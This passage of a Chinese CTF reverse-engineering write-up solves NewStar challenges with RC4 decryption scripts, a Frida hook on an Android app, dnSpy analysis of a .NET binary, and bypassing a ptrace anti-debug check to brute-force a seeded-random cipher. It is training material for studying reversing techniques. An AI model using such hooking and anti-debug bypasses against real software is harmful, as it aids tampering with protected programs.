class="line"></span><br><span class="line">a = <span class="built_in">bytearray</span>(<span class="number">256</span>)</span><br><span class="line">a2=<span class="number">25</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    a[i]=(~(i^<span class="number">25</span>))&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(a2):</span><br><span class="line">    chars[j] = a[chars[j]]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(chars[j]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们将最后输出的值进行md5加密后提交即可</p>
<h3 id="AndroGenshin"><a href="#AndroGenshin" class="headerlink" title="AndroGenshin"></a>AndroGenshin</h3><p>JADX直接分析，我们可以看到他的逻辑，简单分析一下</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39rvk8nhq8o0.webp"></p>
<p>retval 是对username进行rc4加密，username是rc4的密钥，base64_tabla是需要解密的数据，我们直接写脚本进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    key = <span class="built_in">bytearray</span>(key.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        keystream = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        plaintext.append(byte ^ keystream)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用相同的密钥解密数据</span></span><br><span class="line">key = <span class="string">&quot;genshinimpact&quot;</span></span><br><span class="line">encrypted_data = [<span class="number">125</span>, <span class="number">239</span>, <span class="number">101</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">163</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">230</span>, <span class="number">186</span>, <span class="number">206</span>, <span class="number">84</span>, <span class="number">84</span>, <span class="number">189</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">104</span>, <span class="number">178</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">164</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">193</span>, <span class="number">160</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">127</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">177</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">231</span>,<span class="number">250</span>,<span class="number">16</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">188</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">150</span>, <span class="number">40</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">150</span>]  <span class="comment"># 替换为实际的加密数据</span></span><br><span class="line">decrypted_data = rc4_decrypt(key, <span class="built_in">bytes</span>(encrypted_data))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印解密后的数据</span></span><br><span class="line"><span class="built_in">print</span>(decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>这样就得到了我们的base64码表，直接使用网站进行解密就行</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.786srgfovds0.webp"></p>
<p>在程序上username输入genshinimpact，密码输入flag，就会弹出一个原神启动的页面</p>
<p>第二种方法：使用frida hook 的方式进行获取值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> rc4class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.genshin.impact.it_is_not_RC4&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hanshushi:&quot;</span>,rc4class);</span><br><span class="line">        rc4class.<span class="property">rc4</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;zheshi a :&quot;</span>,a);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;zheshi b :&quot;</span>,b);</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">rc4</span>(a,b);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jieguoshi:&quot;</span>,result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>

<p>然后我们在手机用户名输入genshinimpart，密码随便，然后就可以获得码表了</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231104221705868.png" alt="image-20231104221705868"></p>
<h3 id="C？C-？（）"><a href="#C？C-？（）" class="headerlink" title="C？C++？（）"></a>C？C++？（）</h3><p>记录一次手搓脚本，因为原本的数据中存在负数，所以编写代码的时候一直出错，然后到最后就发现总是这两位错误，像%或者&#x2F;&#x2F;这样的数进行逆向就是会发生这样的事，需要自己手搓，但最后发现只需要**%256 **就可以课</p>
<p>记录第一接触.net的题目，第一次使用dnspy进行.net文件的反编译</p>
<p>首先使用DIE查看，发现是长这样的，因为第一次接触，所以一开始并不知道怎么办，默认打开ida进行查看，但你看了后会发现完全做不了，不能反编译啥的</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.313nazrf2zk0.webp"></p>
<p>于是上网搜索，发现是.net类型的逆向题目，我们可以使用dnspy软件进行反编译</p>
<p>我们打开dnspy，选中文件-&gt;打开文件，选择我们的文件，在这个目录就可以查看到我们的主函数，非常直观，随后就到我们审代码，写脚本的时候了</p>
<p><strong><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2h1t2uozbw80.webp"></strong></p>
<p>因为是加减的数值变化，所以不需要在意顺序，我编写出代码后最可恶的是一直报错，因为原数值中有负数，我们最后需要%256一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">array = [</span><br><span class="line">        <span class="number">68</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">72</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">78</span>, <span class="number">83</span>, <span class="number">74</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">86</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">85</span>, <span class="number">44</span>, <span class="number">89</span>, <span class="number">47</span>, <span class="number">92</span>,</span><br><span class="line">        <span class="number">49</span>, <span class="number">88</span>, <span class="number">48</span>, <span class="number">91</span>, <span class="number">88</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">51</span>, <span class="number">76</span>, <span class="number">115</span>,</span><br><span class="line">        -<span class="number">124</span>, <span class="number">125</span>, <span class="number">79</span>, <span class="number">122</span>, -<span class="number">103</span></span><br><span class="line">    ]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(array))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(array[i]),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">num = <span class="number">35</span></span><br><span class="line">array2 = [<span class="string">&#x27; &#x27;</span>] * <span class="number">35</span></span><br><span class="line">array3 = [<span class="number">0</span>] * <span class="number">35</span></span><br><span class="line">text2 = <span class="string">&quot;NEWSTAR&quot;</span></span><br><span class="line">text2=<span class="built_in">list</span>(text2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    array[i]=array[i] - i</span><br><span class="line">    array[i]=array[i] + <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># print(array[i]%255,end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    array[k]=array[k] - (k^(-<span class="built_in">ord</span>(text2[k])%<span class="number">4</span>))</span><br><span class="line">    array[k+<span class="number">7</span>]=array[k+<span class="number">7</span>] - (<span class="built_in">ord</span>(text2[k])%<span class="number">5</span>)</span><br><span class="line">    array[k + <span class="number">14</span>] = array[k + <span class="number">14</span>] - (<span class="number">2</span> * k)</span><br><span class="line">    array[k + <span class="number">21</span>] = array[k + <span class="number">21</span>] - (k ^ <span class="number">2</span>)</span><br><span class="line">    array[k + <span class="number">28</span>] = (array[k + <span class="number">28</span>] - (<span class="built_in">ord</span>(text2[k]) // <span class="number">5</span> + <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    array[i]+=<span class="number">4</span></span><br><span class="line">array[<span class="number">5</span>]+=<span class="number">12</span></span><br><span class="line">array[<span class="number">6</span>]+=<span class="number">12</span></span><br><span class="line"><span class="comment"># array[30]+=0x100</span></span><br><span class="line"><span class="comment"># array[34]+=0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((array[l]%<span class="number">256</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment"># for p in range(num):</span></span><br><span class="line"><span class="comment">#     print(chr((array[p]%255)),end=&#x27;&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="记录一下自己手搓的经过-dnspy动调"><a href="#记录一下自己手搓的经过-dnspy动调" class="headerlink" title="记录一下自己手搓的经过+dnspy动调"></a>记录一下自己手搓的经过+dnspy动调</h4><p>因为flag不正确，所以我把老的flag复制，然后在dnspy中点击上方的启动按钮，输入我们原本错误的flag，让他进行加密，加密结束后我们比较他加密后的数值与我们已知的数值，查看哪几位有错误，在我的原代码中，原本是没有的，是一步步手搓修改的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array[<span class="number">5</span>]+=<span class="number">12</span></span><br><span class="line">array[<span class="number">6</span>]+=<span class="number">12</span></span><br><span class="line"><span class="comment"># array[30]+=0x100</span></span><br><span class="line"><span class="comment"># array[34]+=0x100</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>((array[l]%<span class="number">256</span>)),end=<span class="string">&#x27;&#x27;</span>)中的%<span class="number">256</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fe1yvgdo6w0.webp"></p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009195239402.png"></p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009195316946.png"></p>
<h3 id="AndroDbgMe"><a href="#AndroDbgMe" class="headerlink" title="AndroDbgMe"></a>AndroDbgMe</h3><p>一道很简单的安卓调试题目，但我此前从来没有解出过这种题目，所以这也是开拓了新视野了</p>
<p>安卓调试可以使用模拟器或者手机，写的话不能太详细，推荐一个安卓学习平台</p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1695141-1-1.html">《安卓逆向这档事》一、模拟器环境搭建 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p>其中的第五节就是讲解的如何进行反调试，我使用的软件事jeb，注册什么的都有步骤，但up给的就是完整的，所以可以直接用</p>
<p>我们使用jeb打开文件后，在左侧的层级里选择mainactivity，然后在右侧右击选择解析，即可看见java反编译后的文件，我们在jadx打开后发现的是一串串乱码一样的东西，jeb的强势之处就在于，</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.71s3irmk30w0.png" alt="image"></p>
<p>然后我们在模拟器中打开那个程序</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1shi3av2lls0.webp" alt="image"></p>
<p>然后在shell窗口中打开shell，第一次可能会连接失败，我们只需要再连接一次就可以了，然后连接上模拟器后，我们给模拟器赋予su权限，以致于可以连接上程序</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.10nfmyae5ark.webp" alt="image"></p>
<p>随后在jeb中点击这个按钮，弹出的指视框也能知道，我们调试的程序时正确的，直接选择附上，然后我们在模拟器中点击click就可以获取flag了</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qgr2vzu5zs0.webp" alt="image"></p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5sjekino3y40.webp" alt="image"></p>
<h3 id="R4ndom"><a href="#R4ndom" class="headerlink" title="R4ndom"></a>R4ndom</h3><p>我们分析源码，可以看到如下是主要的加密函数，我们现在需要提出我们的密文，以及知道伪随机数的种子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s[i];</span><br><span class="line">    v4 = rand();</span><br><span class="line">    s[i] = Table[(<span class="number">16</span> * ((<span class="type">unsigned</span> __int8)(v3 + v4 % <span class="number">255</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">15</span>) &amp; (<span class="type">unsigned</span> __int8)(v3 + v4 % <span class="number">255</span>)];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们在右侧的函数中找到srand，然后按x查找哪里调用了他，我们可以看到随机数种子,这是个坑，不要太相信他的反编译的结果，我们看机器码，可以看到真实的随机数种子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">b</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  srand(<span class="number">0x5377654E</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42d0t6dysw20.webp" alt="image"></p>
<p>这个题目一共有两个点：</p>
<p>（1）：这个题目是elf文件，在linux和kali中，伪随机数是不一样的，所以我们需要在linux的环境中才能执行</p>
<p>（2）ELF文件在执行前，会先执行两个函数，其中一个就是.init_array，他会在main函数执行前进行执行，我们发现这其中是有两个函数的</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1vc04muf6qyo.webp" alt="image"></p>
<p>函数a：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">a</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数b：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">b</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  srand(<span class="number">0x5377654E</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到函数a就是反调试的：</p>
<p><code>result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) != 0;</code>: 这行代码使用<code>ptrace</code>系统调用来检测当前进程是否正在被跟踪（调试）。如果<code>ptrace</code>返回的值不等于0（即返回非零值），则说明当前进程正在被跟踪，将<code>result</code>设置为<code>true</code>，否则设置为<code>false</code>。</p>
<p>所以我们可以动调，把断点定在执行他函数a时即将跳转的地方，然后在右侧的代码块右击选择set ip，或者快捷键ctrl+n，但我这里有点小问题，就是我的nop和set ip是一个快捷键，所以我的ctrl+n后把数据nop掉了，离谱</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42u21lez2so0.webp" alt="image"></p>
<p>执行到哪里之后，我们可以再在这个地方，下断点，我们就可以提出我们的加密后的数据了（shift+e）</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68sh79tguhw0.webp" alt="image"></p>
<p>此时我们有了很多需要的内容，那么现在我们就可以写解题脚本了，学习一种新的代码思路，爆破</p>
<p>我们现在已知了加密过程以及加密后的数据，那么我们可以通过爆破的形式来获得我们想要的值，<strong>比如我们知道ascii码表的可显示字符是32-126，那么我们就可以用这些数据一个一个的进行相同的加密，然后和加密后的数据进行对比，如果相同就输出原本的数据，这样就可以了</strong></p>
<p><img src="file:///D:/CTF/REVERSE/可打印字符.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Table[] = &#123; <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,    <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,    <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,    <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,    <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,    <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,    <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,    <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,    <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,    <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,    <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,    <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, 